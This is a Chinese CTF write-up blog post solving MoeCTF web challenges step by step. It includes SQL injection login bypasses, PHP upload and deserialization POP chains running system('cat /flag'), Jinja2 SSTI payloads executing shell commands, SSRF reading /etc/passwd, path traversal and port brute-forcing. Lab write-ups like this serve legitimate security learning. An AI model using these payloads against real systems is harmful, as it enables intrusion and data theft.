---
title: MoeCTF
date: 2024-08-25 17:55:41
tags: 复现
categories: 比赛复现
---

### **弗拉格之地的入口**

根据提示，我们访问robots.txt，得到下一个页面的入口

<!--more-->

![image-20240825180126136](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251801218.png)

然后访问得到flag了

### **垫刀之路01: MoeCTF？启动！**

![image-20240825180238470](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251802507.png)

我们先查找目录

![image-20240825180301970](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251803075.png)

发现了flag，我们打开

![image-20240825180322396](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251803429.png)

提示我们寻找环境变量

我们访问环境变量，找到flag

![image-20240825180435684](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251804734.png)

### **ez_http**

页面提示用post方法，我们就用post方法访问![image-20240825181231433](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251812836.png)

然后就是根据提示一一传值

![image-20240825181318979](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251813896.png)

然后提示页面必须来自 https://www.xidian.edu.cn/

我们修改refer为这个地址

![image-20240825181404615](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251814431.png)

然后提示修改cookie为admin

![image-20240825181503978](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251815085.png)

然后提示用户代理要使用MoeDedicatedBrowser

我们修改User-Agent为这个值

![image-20240825181626144](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251816320.png)

接着提示我们本地登录

我们修改xxf为127.0.0.1

![image-20240825181706279](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251817501.png)

得到flag



### **垫刀之路02: 普通的文件上传**

提示是个文件上传，我们上传个php文件，内容为phpinfo();.

上传成功，我们访问上传路径

![image-20240825181958271](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251819366.png)

得到flag



### **垫刀之路03: 这是一个图床**

提示对文件进行了限制，我们先传个php文件

![image-20240825182140284](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251821324.png)

被限制了，只能传jpg/png/gif 格式的图片

那我们把php文件修改为jpg文件，再进行抓包，修改jpg后缀为php文件

![image-20240825182325442](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251823489.png)

再发包，成功上传，我们访问上传路径，找到flag

![image-20240825182401306](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251824429.png)

### **垫刀之路05: 登陆网站**

我们进行sql注入，直接绕过

```
admin123'#
1
```

登录成功，得到flag

### **垫刀之路06: pop base mini moe**

```
<?php

class A {
    // 注意 private 属性的序列化哦
    private $evil;

    // 如何赋值呢
    private $a;

    function __destruct() {
        $s = $this->a;
        $s($this->evil);
    }
}

class B {
    private $b;

    function __invoke($c) {
        $s = $this->b;
        $s($c);
    }
}


 if(isset($_GET['data']))
 {
     $a = unserialize($_GET['data']);
 }
 else {
     highlight_file(__FILE__);
 }
```

进行代码审计，由于代码中没有命令执行函数，需要我们手动构造

我们发现A类的 \$s(\$this->evil);可以触发B类的\$s($c);,若果s赋值为system，c为rce命令，那我们就能进行命令执行

由于A，B类中存在私有属性，需要我们手动构造序列化链

![image-20240825194348508](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251943541.png)

```
O%3A1%3A%22A%22%3A2%3A%7Bs%3A7%3A%22%00A%00evil%22%3Bs%3A2%3A%22ls%22%3Bs%3A4%3A%22%00A%00a%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A4%3A%22%00B%00b%22%3Bs%3A6%3A%22system%22%3B%7D%7D"
```

然后我们修改命令执行函数，就能得到flag

![image-20240825194435980](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251944158.png)



### **垫刀之路07: 泄漏的密码**

我们打开页面获得一个pin码，我们扫描目录

![image-20240907115147228](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409071151320.png)

得到一个console文件，我们访问这个文件，输入密码，获得控制台权限

然后输入命令，得到flag

![image-20240907115242238](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409071152358.png)



### **弗拉格之地的挑战**

我们先访问/flag1ab.html

![image-20240825210556919](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408252105983.png)

出现了，提示，我们打开页面源码

![image-20240825210615921](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408252106986.png)

找到了第一个flag

```
flag1: bW9lY3Rm
```

我们访问下一个网页

提示我们http，我们对页面进行抓包

![image-20240825210738254](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408252107534.png)

发现了第二个flag

```
flag1: bW9lY3Rm
flag2：e0FmdEV
```

我们继续访问

![image-20240825210942793](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408252109896.png)

根据页面提示一一做，admin那个要修改cookie

```
flag1: bW9lY3Rm
flag2：e0FmdEV
flag3: yX3RoMXN
```

我们前往下一关

![image-20240825211027004](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408252110052.png)

提示我们要修改Refer

![image-20240825211157621](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408252111734.png)

我们前往了第四关，提示我们按下9

![image-20240825211218012](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408252112041.png)

但按钮上没有9，我们修改js

![image-20240825211337469](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408252113711.png)

我们查看控制台

![image-20240825211437839](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408252114916.png)

```
flag1: bW9lY3Rm
flag2：e0FmdEV
flag3: yX3RoMXN
flag4：fdFVUMHJ
```

第五关直接禁用js就行了

![image-20240825213750207](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408252137270.png)

```
flag1: bW9lY3Rm
flag2：e0FmdEV
flag3: yX3RoMXN
flag4：fdFVUMHJ
flag5: fSV90aDF
```

第六关我们要审计代码

```
<?php
highlight_file("flag6diw.php");
if (isset($_GET['moe']) && $_POST['moe']) {
    if (preg_match('/flag/', $_GET['moe'])) {
        die("no");
    } elseif (preg_match('/flag/i', $_GET['moe'])) {
        echo "flag6: xxx";
    }
}
```

第一个if的正则匹配和第二个的区别就是大小写的区别，我们用大写的flag直接绕过

![image-20240825214025941](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408252140990.png)

```
flag1: bW9lY3Rm
flag2：e0FmdEV
flag3: yX3RoMXN
flag4：fdFVUMHJ
flag5: fSV90aDF
flag6: rZV9VX2t
```

第7关我们进行rce

```
what=system("cat ../../../flag7");
```

```
 flag1: bW9lY3Rm
flag2：e0FmdEV
flag3: yX3RoMXN
flag4：fdFVUMHJ
flag5: fSV90aDF
flag6: rZV9VX2t
 flag7:rbm93X1dlQn0=
```

解码得到flag

![image-20240825214609154](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408252146227.png)

### **静态网页**

我们打开网页源码，往下翻，有提示

![image-20240907121031314](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409071210411.png)

我们点击人物模型进行抓包

![image-20240907121054973](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409071210046.png)

在flag处找到下一个文件，我们访问，进行代码审计

```
<?php
highlight_file('final1l1l_challenge.php');
error_reporting(0);
include 'flag.php';

$a = $_GET['a'];
$b = $_POST['b'];
if (isset($a) && isset($b)) {
    if (!is_numeric($a) && !is_numeric($b)) {
        if ($a == 0 && md5($a) == $b[$a]) {
            echo $flag;
        } else {
            die('noooooooooooo');
        }
    } else {
        die( 'Notice the param type!');
    }
} else {
    die( 'Where is your param?');
} 
```

要绕过第二个if，需要a和b的值不为数字或数字字符串

绕过第三个if，需要\$a的值为0，同时md5($a) == $b[$a])

我们了解当a为字符串时，a能跟0弱比较相等，因此，如果b的第一个字符为0，同时a的md5为0，就能绕过if

```
?a=s878926199a
b=0a
```

得到flag

### **ImageCloud前置**

该题为ssrf

我们用file协议访问/etc/passwd

```
?url=file:///etc/passwd
```

得到flag







### **垫刀之路04: 一个文件浏览器**

![image-20240908170527774](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409081705946.png)

提示不在这个目录下，我们尝试目录穿越

```
?path=../../../../
```

![image-20240908170604008](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409081706079.png)

来到了一个新的目录，我们点击flag，提示在不远处

![image-20240908170631915](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409081706952.png)



我们在/tmp里发现flag![image-20240908170652039](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409081706114.png)

### **ProveYourLove**

解法一：

首先打开网页，进行提交，发现是前端进行响应，那我们抓包进行爆破

![image-20240910203356086](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409102033215.png)

随便找个值爆破

![image-20240910203429299](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409102034389.png)

我们使用数字爆破，范围直接从1到301

爆破完后属性页面得到flag

![image-20240910203636075](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409102036178.png)



解法二（不推荐）：

开300个容器，一个一个提交

### **电院_Backend**

我们扫描目录得到/admin/这个目录

我们访问

![image-20240910213232310](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409102132448.png)

看到一个登录框，我们查看他给的源码

```
<?php
error_reporting(0);
session_start();

if($_POST){
    $verify_code = $_POST['verify_code'];

    // 验证验证码
    if (empty($verify_code) || $verify_code !== $_SESSION['captcha_code']) {
        echo json_encode(array('status' => 0,'info' => '验证码错误啦，再输入吧'));
        unset($_SESSION['captcha_code']);
        exit;
    }

    $email = $_POST['email'];
    if(!preg_match("/[a-zA-Z0-9]+@[a-zA-Z0-9]+\\.[a-zA-Z0-9]+/", $email)||preg_match("/or/i", $email)){
        echo json_encode(array('status' => 0,'info' => '不存在邮箱为： '.$email.' 的管理员账号！'));
        unset($_SESSION['captcha_code']);
        exit;
    }

    $pwd = $_POST['pwd'];
    $pwd = md5($pwd);
    $conn = mysqli_connect("localhost","root","123456","xdsec",3306);


    $sql = "SELECT * FROM admin WHERE email='$email' AND pwd='$pwd'";
    $result = mysqli_query($conn,$sql);
    $row = mysqli_fetch_array($result);

    if($row){
        $_SESSION['admin_id'] = $row['id'];
        $_SESSION['admin_email'] = $row['email'];
        echo json_encode(array('status' => 1,'info' => '登陆成功，moectf{testflag}'));
    } else{
        echo json_encode(array('status' => 0,'info' => '管理员邮箱或密码错误'));
        unset($_SESSION['captcha_code']);
    }
}


?>
```

邮箱要是xxx.@xxx的格式，密码会被md5加密，然后会执行sql语句

重点看这串代码

```
  $sql = "SELECT * FROM admin WHERE email='$email' AND pwd='$pwd'";
    $result = mysqli_query($conn,$sql);
    $row = mysqli_fetch_array($result);
```

由于pwd被md5加密了，我们不考虑当做注入点

所以我们用email进行注入

我们尝试万能注入

```
123@qq.com' || 1=1 #
```

随便输个密码，填写验证码，登录得到flag

![image-20240910213619430](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409102136562.png)

注：POST使用#或%23注释

GET使用--+进行注释

### **who's blog?**

我们打开网页，提示我们使用id

![image-20240911201946361](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409112019451.png)

我们传个id=1

```
?id=1
```

发现标题有变化

![image-20240911202017807](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409112020907.png)

我们考虑ssti

尝试

```
?id={{7*7}}
```

回显49，嗯，为ssti模版注入

![image-20240911202133022](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409112021155.png)

该题为jinja2模版

```
?id={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
```

回显root

![](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409112022254.png)

我们访问根目录，没发现有flag

```
?id={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls ../').read()") }}{% endif %}{% endfor %}
```

![image-20240911202311569](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409112023725.png)

我们考虑是否在环境变量里

```
?id={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('env').read()") }}{% endif %}{% endfor %}
```

成功找到flag

![image-20240911202359735](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409112023783.png)

### **勇闯铜人阵**

让我们愉快的写脚本

```
import requests
url="http://192.168.80.1:55726/"
session=requests.Session()
data1={
    'player':1,
    'direct':'弟子明白'
}
d1=["北方","东北方","东方","东南方","南方","西南方","西方","西北方"]
d2=["北方一个","东北方一个","东方一个","东南方一个","南方一个","西南方一个","西方一个","西北方一个"]
a=[1,2,3,4,5,6,7,8]
r=session.post(url,data=data1)
n=6
while(n):
    num=0
    st=''
    b=(r.text)[-30:-22]
    print(b)
    for i in a:
        if str(i) in b:
            num+=1
            st+=str(i)
    if num==1:
        data={
            'player':1,
            'direct': f'{d1[int(st)-1]}'
        }
        r = session.post(url, data=data)
        print(d1[int(st)-1])
        print(r.text)
    if num==2:
        data = {
            'player': 1,
            'direct': f'{d2[int(st[0])-1]}，{d2[int(st[1])-1]}'
        }
        r = session.post(url, data=data)
        print(r.text)
        print(456)
    n=n-1

```

得到flag

![image-20240911220506277](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409112205367.png)



### pop moe

```
<?php

class class000 {
    private $payl0ad = 0;
    protected $what;

    public function __destruct()
    {
        $this->check();
    }

    public function check()
    {
        if($this->payl0ad === 0)
        {
            die('FAILED TO ATTACK');
        }
        $a = $this->what;
        $a();
    }
}

class class001 {
    public $payl0ad;
    public $a;
    public function __invoke()
    {
        $this->a->payload = $this->payl0ad;
    }
}

class class002 {
    private $sec;
    public function __set($a, $b)
    {
        $this->$b($this->sec);
    }

    public function dangerous($whaattt)
    {
        $whaattt->evvval($this->sec);
    }

}

class class003 {
    public $mystr;
    public function evvval($str)
    {
        eval($str);
    }

    public function __tostring()
    {
        return $this->mystr;
    }
}

if(isset($_GET['data']))
{
    $a = unserialize($_GET['data']);
}
else {
    highlight_file(__FILE__);
}
```

先代码审计，我们发现eval函数在class003里，所以我们的目的是触发这个函数

```
class class003 {
    public $mystr;
    public function evvval($str)
    {
        eval($str);
    }

    public function __tostring()
    {
        return $this->mystr;
    }
}
```

我们先往上看，在class002中发现了个\$whaattt->evvval($this->sec)，如果\$whaattt为class003，sec为rce命令，问题就解决了，但我们不能直接使用dangerous方法，我们发现在__set方法里，如果b为dangerous，sec为new class003(),由于sec被当做字符串处理，会触发class003中的\_\_tostring方法,得到mystr的值，若mystr的值为命令函数，就能实现rce

```
class class002 {
    private $sec;
    public function __set($a, $b)
    {
        $this->$b($this->sec);
    }

    public function dangerous($whaattt)
    {
        $whaattt->evvval($this->sec);
    }

}
```

所以接下来我们需要触发__set方法，且b的值为dangerous

我们看到class001中出现了payload，应该未被定义的值，通过它，我们能触发set方法

```
class class001 {
    public $payl0ad;
    public $a;
    public function __invoke()
    {
        $this->a->payload = $this->payl0ad;
    }
}

```

接下来就是触发__invoke()方法了，我们看class001，我们发现$a()，可通过这个触发invoke()方法

```
<?php

class class000 {
    private $payl0ad = 0;
    protected $what;

    public function __destruct()
    {
        $this->check();
    }

    public function check()
    {
        if($this->payl0ad === 0)
        {
            die('FAILED TO ATTACK');
        }
        $a = $this->what;
        $a();
    }
}
```

接下来就是构造pop链

```
<?php

class A {
    // 注意 private 属性的序列化哦
    private $evil='cat /flag';

    // 如何赋值呢
    private $a;
    function Seta($a)
    {
        $this->a=$a;
    }
    function __destruct() {
        $s = $this->a;
        $s($this->evil);
    }
}

class B {
    private $b='system';
    
    function __invoke($c) {
        $s = $this->b;
        $s($c);
    }
}
$a=new A();
$b =new B();
$a->Seta($b);
echo urlencode(serialize($a));
```

### ImageCloud

我们打开链接，发现有个上传功能

我们上传了一张图片后，打开发现url访问了内部云文件

![image-20241015204148265](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410152041343.png)

我们来看附件给出的东西

![image-20241015204409765](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410152044801.png)

有两个py文件，upload里有个flag.jpg，说明上传了一个flag.jpg照片，我们需要打开它，我们来看两个py文件

一个是5000端口的外部云文件，保存图片路径为static，另一个是端口在5001到6000中间随机的内部云文件，保存路径是uploads。

```
#外部云
@app.route('/image', methods=['GET'])
def load_image():
    url = request.args.get('url')
    if not url:
        return 'URL 参数缺失', 400
 
    try:
        response = requests.get(url)
        response.raise_for_status()
        img = Image.open(BytesIO(response.content))
 
        img_io = BytesIO()
        img.save(img_io, img.format)
        img_io.seek(0)
        return send_file(img_io, mimetype=img.get_format_mimetype())
    except Exception as e:
        return f"无法加载图片: {str(e)}", 400
```

从外部云这里可以发现，image路由可以对内部云进行请求获取图片。

先随便上传一个图片，然后对其抓包，尝试爆破内部云端口。

![image-20241015210425425](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410152104523.png)

在5392端口处找到flag图片

![image-20241015211038851](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410152110934.png)
